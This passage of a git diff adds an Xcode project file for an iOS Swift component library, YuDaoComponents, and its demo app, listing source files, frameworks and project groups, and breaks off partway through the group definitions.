@@ -1,0 +1,1345 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 50;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		1B4D607E214A0BAE00E00013 /* NoDataViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1B4D607D214A0BAE00E00013 /* NoDataViewController.swift */; };
+		1BCA8AE621489F090037AFC1 /* CalendarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1BCA8AE521489F090037AFC1 /* CalendarController.swift */; };
+		1BE0BBFF2148A852001507BA /* CalendarCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1BE0BBFE2148A852001507BA /* CalendarCell.swift */; };
+		1BE0BC022148A946001507BA /* CalendarViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1BE0BC012148A946001507BA /* CalendarViewController.swift */; };
+		3B17AF1121883EB50027B896 /* Double+yd.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B17AF1021883EB50027B896 /* Double+yd.swift */; };
+		3B26BAA0214B5C1D006FEE22 /* CalendarView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B26BA9F214B5C1D006FEE22 /* CalendarView.swift */; };
+		3B26BAA2214B5D3E006FEE22 /* CalenderViewPicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B26BAA1214B5D3E006FEE22 /* CalenderViewPicker.swift */; };
+		3B26BAA52150A597006FEE22 /* RefreshEmptyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B26BAA42150A597006FEE22 /* RefreshEmptyView.swift */; };
+		3B2B04C7210805640067347E /* YuDaoComponents.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 3B2B04BD210805640067347E /* YuDaoComponents.framework */; };
+		3B2B04CC210805650067347E /* YuDaoComponentsTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2B04CB210805640067347E /* YuDaoComponentsTests.swift */; };
+		3B2B04CE210805650067347E /* YuDaoComponents.h in Headers */ = {isa = PBXBuildFile; fileRef = 3B2B04C0210805640067347E /* YuDaoComponents.h */; settings = {ATTRIBUTES = (Public, ); }; };
+		3B2B04DE210807090067347E /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2B04DD210807090067347E /* AppDelegate.swift */; };
+		3B2B04E0210807090067347E /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2B04DF210807090067347E /* ViewController.swift */; };
+		3B2B04E3210807090067347E /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 3B2B04E1210807090067347E /* Main.storyboard */; };
+		3B2B04E52108070A0067347E /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 3B2B04E42108070A0067347E /* Assets.xcassets */; };
+		3B2B04E82108070A0067347E /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 3B2B04E62108070A0067347E /* LaunchScreen.storyboard */; };
+		3B2B0515210813D30067347E /* YuDaoExtesionable.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2B0514210813D30067347E /* YuDaoExtesionable.swift */; };
+		3B2B0517210815310067347E /* RxSwift+yd.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2B0516210815310067347E /* RxSwift+yd.swift */; };
+		3B2B0519210816340067347E /* Int+yd.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2B0518210816340067347E /* Int+yd.swift */; };
+		3B2B051B210816850067347E /* String+yd.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2B051A210816850067347E /* String+yd.swift */; };
+		3B2B051D210816B60067347E /* Array+yd.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2B051C210816B60067347E /* Array+yd.swift */; };
+		3B2B051F2108171B0067347E /* Dictionary+yd.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2B051E2108171B0067347E /* Dictionary+yd.swift */; };
+		3B2B0521210817350067347E /* Data+yd.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2B0520210817350067347E /* Data+yd.swift */; };
+		3B2B0523210817550067347E /* UIColor+yd.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2B0522210817550067347E /* UIColor+yd.swift */; };
+		3B2B0525210817780067347E /* UIImage+yd.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2B0524210817780067347E /* UIImage+yd.swift */; };
+		3B2B0527210817980067347E /* UIView+yd.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2B0526210817980067347E /* UIView+yd.swift */; };
+		3B2BA2A8211A761500391656 /* CountDownButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2BA2A7211A761500391656 /* CountDownButton.swift */; };
+		3B2BA2AB211A80EA00391656 /* CountDownButtonVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B2BA2AA211A80EA00391656 /* CountDownButtonVC.swift */; };
+		3B2BA2AC211A82B800391656 /* YuDaoComponents.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 3B2B04BD210805640067347E /* YuDaoComponents.framework */; };
+		3B419E042109A24D0065079F /* Tools.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B419E032109A24D0065079F /* Tools.swift */; };
+		3B4FDC4421ACE9FE00DB82FA /* Date+yd.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B4FDC4321ACE9FE00DB82FA /* Date+yd.swift */; };
+		3BA43DAF21096CED0063B763 /* RouterDefines.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BA43DAD21096CED0063B763 /* RouterDefines.swift */; };
+		3BA43DB021096CED0063B763 /* RouterManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BA43DAE21096CED0063B763 /* RouterManager.swift */; };
+		3BA43DB621096CF10063B763 /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BA43DB221096CF10063B763 /* BaseViewController.swift */; };
+		3BA43DB721096CF10063B763 /* BaseSectionView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BA43DB321096CF10063B763 /* BaseSectionView.swift */; };
+		3BA43DB821096CF10063B763 /* BaseTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BA43DB421096CF10063B763 /* BaseTableViewCell.swift */; };
+		3BA43DB921096CF10063B763 /* BaseTableViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BA43DB521096CF10063B763 /* BaseTableViewController.swift */; };
+		3BC6BA18210E0D2900C038BF /* HttpRequestParam.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BC6BA17210E0D2900C038BF /* HttpRequestParam.swift */; };
+		3BC6BA1A210E0D4300C038BF /* HttpRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BC6BA19210E0D4300C038BF /* HttpRequest.swift */; };
+		3BC6BA1C210E0D6000C038BF /* HttpRequestSender.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BC6BA1B210E0D6000C038BF /* HttpRequestSender.swift */; };
+		3BC6BA1E210E0D6900C038BF /* HttpResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BC6BA1D210E0D6900C038BF /* HttpResponse.swift */; };
+		3BC6BA20210E0D7B00C038BF /* HttpResponseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BC6BA1F210E0D7B00C038BF /* HttpResponseModel.swift */; };
+		3BC86B90210EB8F100904954 /* UIViewController+yd.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BC86B8F210EB8F100904954 /* UIViewController+yd.swift */; };
+		3BD1FDF0211148B90094E99F /* UILabel+yd.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BD1FDEF211148B90094E99F /* UILabel+yd.swift */; };
+		3BD76756213CCA1000462321 /* BaseWebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BD76755213CCA1000462321 /* BaseWebViewController.swift */; };
+		3BD76777213CFF6C00462321 /* common_btn_nav_back@2x.png in Resources */ = {isa = PBXBuildFile; fileRef = 3BD76764213CD9DD00462321 /* common_btn_nav_back@2x.png */; };
+		3BD76779213CFF7A00462321 /* TestWebViewVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BD76778213CFF7A00462321 /* TestWebViewVC.swift */; };
+		3BE56CA821830B8200C168D7 /* ButtonFlow.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BE56CA721830B8200C168D7 /* ButtonFlow.swift */; };
+		3BE56CAB21842FC300C168D7 /* ButtonFlowVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BE56CAA21842FC300C168D7 /* ButtonFlowVC.swift */; };
+		3BEA29A221D1FAD500D45356 /* MvvmDemoVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BEA29A121D1FAD500D45356 /* MvvmDemoVC.swift */; };
+		5E82CEF4C4A993F7B9CAEDC9 /* Pods_YuDaoComponents.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 06C52301F42C5CEC64B5E6EA /* Pods_YuDaoComponents.framework */; };
+		D5FEC513CF1338A5BCD5E908 /* Pods_YuDaoComponentsDemo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 10A6A4908FE997951ABD0D4D /* Pods_YuDaoComponentsDemo.framework */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		3B2B04C8210805640067347E /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 3B2B04B4210805640067347E /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 3B2B04BC210805640067347E;
+			remoteInfo = YuDaoComponents;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		03E0EA72839F50FF975D3550 /* Pods-YuDaoComponents.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-YuDaoComponents.release.xcconfig"; path = "Pods/Target Support Files/Pods-YuDaoComponents/Pods-YuDaoComponents.release.xcconfig"; sourceTree = "<group>"; };
+		06C52301F42C5CEC64B5E6EA /* Pods_YuDaoComponents.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_YuDaoComponents.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		10A6A4908FE997951ABD0D4D /* Pods_YuDaoComponentsDemo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_YuDaoComponentsDemo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		16B53BAFC930CD74981BB7FD /* Pods-YuDaoComponentsDemo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-YuDaoComponentsDemo.debug.xcconfig"; path = "Pods/Target Support Files/Pods-YuDaoComponentsDemo/Pods-YuDaoComponentsDemo.debug.xcconfig"; sourceTree = "<group>"; };
+		1B4D607D214A0BAE00E00013 /* NoDataViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NoDataViewController.swift; sourceTree = "<group>"; };
+		1BCA8AE521489F090037AFC1 /* CalendarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CalendarController.swift; sourceTree = "<group>"; };
+		1BE0BBFE2148A852001507BA /* CalendarCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CalendarCell.swift; sourceTree = "<group>"; };
+		1BE0BC012148A946001507BA /* CalendarViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CalendarViewController.swift; sourceTree = "<group>"; };
+		3B17AF1021883EB50027B896 /* Double+yd.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Double+yd.swift"; sourceTree = "<group>"; };
+		3B26BA9D214B55EE006FEE22 /* zh-Hans */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = "zh-Hans"; path = "zh-Hans.lproj/Main.strings"; sourceTree = "<group>"; };
+		3B26BA9E214B55EE006FEE22 /* zh-Hans */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = "zh-Hans"; path = "zh-Hans.lproj/LaunchScreen.strings"; sourceTree = "<group>"; };
+		3B26BA9F214B5C1D006FEE22 /* CalendarView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CalendarView.swift; sourceTree = "<group>"; };
+		3B26BAA1214B5D3E006FEE22 /* CalenderViewPicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CalenderViewPicker.swift; sourceTree = "<group>"; };
+		3B26BAA42150A597006FEE22 /* RefreshEmptyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RefreshEmptyView.swift; sourceTree = "<group>"; };
+		3B2B04BD210805640067347E /* YuDaoComponents.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = YuDaoComponents.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		3B2B04C0210805640067347E /* YuDaoComponents.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = YuDaoComponents.h; sourceTree = "<group>"; };
+		3B2B04C1210805640067347E /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		3B2B04C6210805640067347E /* YuDaoComponentsTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = YuDaoComponentsTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		3B2B04CB210805640067347E /* YuDaoComponentsTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YuDaoComponentsTests.swift; sourceTree = "<group>"; };
+		3B2B04CD210805650067347E /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		3B2B04DB210807090067347E /* YuDaoComponentsDemo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = YuDaoComponentsDemo.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		3B2B04DD210807090067347E /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		3B2B04DF210807090067347E /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
+		3B2B04E2210807090067347E /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		3B2B04E42108070A0067347E /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		3B2B04E72108070A0067347E /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		3B2B04E92108070A0067347E /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		3B2B04ED2108107B0067347E /* YuDaoComponents.podspec */ = {isa = PBXFileReference; lastKnownFileType = text; path = YuDaoComponents.podspec; sourceTree = "<group>"; xcLanguageSpecificationIdentifier = xcode.lang.ruby; };
+		3B2B0514210813D30067347E /* YuDaoExtesionable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YuDaoExtesionable.swift; sourceTree = "<group>"; };
+		3B2B0516210815310067347E /* RxSwift+yd.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "RxSwift+yd.swift"; sourceTree = "<group>"; };
+		3B2B0518210816340067347E /* Int+yd.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Int+yd.swift"; sourceTree = "<group>"; };
+		3B2B051A210816850067347E /* String+yd.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "String+yd.swift"; sourceTree = "<group>"; };
+		3B2B051C210816B60067347E /* Array+yd.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Array+yd.swift"; sourceTree = "<group>"; };
+		3B2B051E2108171B0067347E /* Dictionary+yd.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Dictionary+yd.swift"; sourceTree = "<group>"; };
+		3B2B0520210817350067347E /* Data+yd.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Data+yd.swift"; sourceTree = "<group>"; };
+		3B2B0522210817550067347E /* UIColor+yd.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIColor+yd.swift"; sourceTree = "<group>"; };
+		3B2B0524210817780067347E /* UIImage+yd.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIImage+yd.swift"; sourceTree = "<group>"; };
+		3B2B0526210817980067347E /* UIView+yd.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIView+yd.swift"; sourceTree = "<group>"; };
+		3B2BA2A7211A761500391656 /* CountDownButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountDownButton.swift; sourceTree = "<group>"; };
+		3B2BA2AA211A80EA00391656 /* CountDownButtonVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountDownButtonVC.swift; sourceTree = "<group>"; };
+		3B419E032109A24D0065079F /* Tools.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Tools.swift; sourceTree = "<group>"; };
+		3B4FDC4321ACE9FE00DB82FA /* Date+yd.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Date+yd.swift"; sourceTree = "<group>"; };
+		3BA43DAD21096CED0063B763 /* RouterDefines.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RouterDefines.swift; sourceTree = "<group>"; };
+		3BA43DAE21096CED0063B763 /* RouterManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RouterManager.swift; sourceTree = "<group>"; };
+		3BA43DB221096CF10063B763 /* BaseViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
+		3BA43DB321096CF10063B763 /* BaseSectionView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BaseSectionView.swift; sourceTree = "<group>"; };
+		3BA43DB421096CF10063B763 /* BaseTableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BaseTableViewCell.swift; sourceTree = "<group>"; };
+		3BA43DB521096CF10063B763 /* BaseTableViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BaseTableViewController.swift; sourceTree = "<group>"; };
+		3BC6BA17210E0D2900C038BF /* HttpRequestParam.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HttpRequestParam.swift; sourceTree = "<group>"; };
+		3BC6BA19210E0D4300C038BF /* HttpRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HttpRequest.swift; sourceTree = "<group>"; };
+		3BC6BA1B210E0D6000C038BF /* HttpRequestSender.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HttpRequestSender.swift; sourceTree = "<group>"; };
+		3BC6BA1D210E0D6900C038BF /* HttpResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HttpResponse.swift; sourceTree = "<group>"; };
+		3BC6BA1F210E0D7B00C038BF /* HttpResponseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HttpResponseModel.swift; sourceTree = "<group>"; };
+		3BC86B8F210EB8F100904954 /* UIViewController+yd.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIViewController+yd.swift"; sourceTree = "<group>"; };
+		3BD1FDEF211148B90094E99F /* UILabel+yd.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UILabel+yd.swift"; sourceTree = "<group>"; };
+		3BD76755213CCA1000462321 /* BaseWebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseWebViewController.swift; sourceTree = "<group>"; };
+		3BD76764213CD9DD00462321 /* common_btn_nav_back@2x.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; path = "common_btn_nav_back@2x.png"; sourceTree = "<group>"; };
+		3BD76778213CFF7A00462321 /* TestWebViewVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TestWebViewVC.swift; sourceTree = "<group>"; };
+		3BE56CA721830B8200C168D7 /* ButtonFlow.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ButtonFlow.swift; sourceTree = "<group>"; };
+		3BE56CAA21842FC300C168D7 /* ButtonFlowVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ButtonFlowVC.swift; sourceTree = "<group>"; };
+		3BEA29A121D1FAD500D45356 /* MvvmDemoVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MvvmDemoVC.swift; sourceTree = "<group>"; };
+		C8DD70D9DB56D4A513ACC3FE /* Pods-YuDaoComponents.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-YuDaoComponents.debug.xcconfig"; path = "Pods/Target Support Files/Pods-YuDaoComponents/Pods-YuDaoComponents.debug.xcconfig"; sourceTree = "<group>"; };
+		ED60A1F9F2FBE1E2010F3B1D /* Pods-YuDaoComponentsDemo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-YuDaoComponentsDemo.release.xcconfig"; path = "Pods/Target Support Files/Pods-YuDaoComponentsDemo/Pods-YuDaoComponentsDemo.release.xcconfig"; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		3B2B04B9210805640067347E /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				5E82CEF4C4A993F7B9CAEDC9 /* Pods_YuDaoComponents.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		3B2B04C3210805640067347E /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				3B2B04C7210805640067347E /* YuDaoComponents.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		3B2B04D8210807090067347E /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				3B2BA2AC211A82B800391656 /* YuDaoComponents.framework in Frameworks */,
+				D5FEC513CF1338A5BCD5E908 /* Pods_YuDaoComponentsDemo.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		1B4D607F214A0C0600E00013 /* EmptyView */ = {
+			isa = PBXGroup;
+			children = (
+				1B4D607D214A0BAE00E00013 /* NoDataViewController.swift */,
+			);
+			path = EmptyView;
+			sourceTree = "<group>";
+		};
+		1BCA8AE421489DDC0037AFC1 /* Calendar */ = {
+			isa = PBXGroup;
+			children = (
+				1BCA8AE521489F090037AFC1 /* CalendarController.swift */,
+				1BE0BBFE2148A852001507BA /* CalendarCell.swift */,
+				3B26BA9F214B5C1D006FEE22 /* CalendarView.swift */,
+				3B26BAA1214B5D3E006FEE22 /* CalenderViewPicker.swift */,
+			);
+			path = Calendar;
+			sourceTree = "<group>";
+		};
+		1BE0BC002148A8DD001507BA /* CalendarView */ = {
+			isa = PBXGroup;
+			children = (
+				1BE0BC012148A946001507BA /* CalendarViewController.swift */,
+			);
+			path = CalendarView;
+			sourceTree = "<group>";
+		};
+		3B26BAA32150A539006FEE22 /* RefreshEmptyView */ = {
+			isa = PBXGroup;
+			children = (
+				3B26BAA42150A597006FEE22 /* RefreshEmptyView.swift */,
+			);
+			path = RefreshEmptyView;
+			sourceTree = "<group>";
+		};
+		3B2B04B3210805640067347E = {
+			isa = PBXGroup;
+			children = (
+				3B2B04ED2108107B0067347E /* YuDaoComponents.podspec */,
+				3B2B04BF210805640067347E /* YuDaoComponents */,
+				3B2B04CA210805640067347E /* YuDaoComponentsTests */,
+				3B2B04DC210807090067347E /* YuDaoComponentsDemo */,
+				3B2B04BE210805640067347E /* Products */,
+				56F0D00B35D5892A720BE6D7 /* Pods */,
+				89176D331A3EDDD435329410 /* Frameworks */,
+			);
+			sourceTree = "<group>";
+		};
+		3B2B04BE210805640067347E /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				3B2B04BD210805640067347E /* YuDaoComponents.framework */,
+				3B2B04C6210805640067347E /* YuDaoComponentsTests.xctest */,
+				3B2B04DB210807090067347E /* YuDaoComponentsDemo.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		3B2B04BF210805640067347E /* YuDaoComponents */ = {
+			isa = PBXGroup;
+			children = (
+				3BC6BA16210E04A400C038BF /* Http */,
+				3B419E022109A2320065079F /* Tools */,
+				3BA43DAC21096CED0063B763 /* Router */,
+				3BA43DB121096CF10063B763 /* MVVM */,
+				3B2B0513210813B30067347E /* Category */,
+				3B2BA2A6211A75FD00391656 /* CountDownButton */,
+				1BCA8AE421489DDC0037AFC1 /* Calendar */,
+				3B26BAA32150A539006FEE22 /* RefreshEmptyView */,
+				3BE56CA621830B5000C168D7 /* ButtonFlow */,
+				3B2B04C0210805640067347E /* YuDaoComponents.h */,
+				3B2B04C1210805640067347E /* Info.plist */,
+			);
+			path = YuDaoComponents;
+			sourceTree = "<group>";
+		};
+		3B2B04CA210805640067347E /* YuDaoComponentsTests */ = {
+			isa = PBXGroup;
+			children = (
+				3B2B04CB210805640067347E /* YuDaoComponentsTests.swift */,
+				3B2B04CD210805650067347E /* Info.plist */,
+			);
+			path = YuDaoComponentsTests;
+			sourceTree = "<group>";
+		};
+		3B2B04DC210807090067347E /* YuDaoComponentsDemo */ = {
+			isa = PBXGroup;
+			children = (
+				3BEA29A021D1DA9400D45356 /* MVVM */,
+				1B4D607F214A0C0600E00013 /* EmptyView */,
+				1BE0BC002148A8DD001507BA /* CalendarView */,
+				3BD76776213CDC3F00462321 /* WebView */,
+				3B2BA2A9211A80DC00391656 /* CountDownButton */,
+				3BE56CA921842FB300C168D7 /* ButtonFlow */,
+				3B2B04DD210807090067347E /* AppDelegate.swift */,
+				3B2B04DF210807090067347E /* ViewController.swift */,
+				3B2B04E1210807090067347E /* Main.storyboard */,
+				3B2B04E42108070A0067347E /* Assets.xcassets */,
+				3B2B04E62108070A0067347E /* LaunchScreen.storyboard */,
+				3B2B04E92108070A0067347E /* Info.plist */,
+			);
+			path = YuDaoComponentsDemo;
+			sourceTree = "<group>";
+		};
+		3B2B0513210813B30067347E /* Category */ = {
+			isa = PBXGroup;
+			children = (
+				3B2B0514210813D30067347E /* YuDaoExtesionable.swift */,
+				3B2B0516210815310067347E /* RxSwift+yd.swift */,
+				3B2B0518210816340067347E /* Int+yd.swift */,
+				3B17AF1021883EB50027B896 /* Double+yd.swift */,
+				3B2B051A210816850067347E /* String+yd.swift */,
+				3B2B051C210816B60067347E /* Array+yd.swift */,
+				3B2B051E2108171B0067347E /* Dictionary+yd.swift */,
+				3B2B0520210817350067347E /* Data+yd.swift */,
+				3B4FDC4321ACE9FE00DB82FA /* Date+yd.swift */,
+				3B2B0522210817550067347E /* UIColor+yd.swift */,
+				3B2B0524210817780067347E /* UIImage+yd.swift */,
+				3B2B0526210817980067347E /* UIView+yd.swift */,
+				3BD1FDEF211148B90094E99F /* UILabel+yd.swift */,
+				3BC86B8F210EB8F100904954 /* UIViewController+yd.swift */,
+			);
+			path = Category;
+			sourceTree = "<group>";
+		};
+		3B2BA2A6211A75FD00391656 /* CountDownButton */ = {
+			isa = PBXGroup;
+			children = (
+				3B2BA2A7211A761500391656 /* CountDownButton.swift */,
+			);
+			path = CountDownButton;
+			sourceTree = "<group>";
+		};
+		3B2BA2A9211A80DC00391656 /* CountDownButton */ = {
+			isa = PBXGroup;
+			children = (
+				3B2BA2AA211A80EA00391656 /* CountDownButtonVC.swift */,
+			);
+			path = CountDownButton;
+			sourceTree = "<group>";
+		};
+		3B419E022109A2320065079F /* Tools */ = {
+			isa = PBXGroup;
+			children = (
+				3B419E032109A24D0065079F /* Tools.swift */,
+			);
+			path = Tools;
+			sourceTree = "<group>";
+		};
+		3BA43DAC21096CED0063B763 /* Router */ = {
+			isa = PBXGroup;
+			children = (
+				3BA43DAD21096CED0063B763 /* RouterDefines.swift */,
+				3BA43DAE21096CED0063B763 /* RouterManager.swift */,
+			);
+			path = Router;
+			sourceTree = "<group>";
+		};
+		3BA43DB121096CF10063B763 /* MVVM */ = {
+			isa = PBXGroup;
+			children = (
+				3BA43DB221096CF10063B763 /* BaseViewController.swift */,
+				3BA43DB321096CF10063B763 /* BaseSectionView.swift */,
+				3BA43DB421096CF10063B763 /* BaseTableViewCell.swift */,
+				3BA43DB521096CF10063B763 /* BaseTableViewController.swift */,
+				3BD76755213CCA1000462321 /* BaseWebViewController.swift */,
+			);
+			path = MVVM;
+			sourceTree = "<group>";
+		};
+		3BC6BA16210E04A400C038BF /* Http */ = {
+			isa = PBXGroup;
+			children = (
+				3BC6BA17210E0D2900C038BF /* HttpRequestParam.swift */,
+				3BC6BA19210E0D4300C038BF /* HttpRequest.swift */,
+				3BC6BA1B210E0D6000C038BF /* HttpRequestSender.swift */,
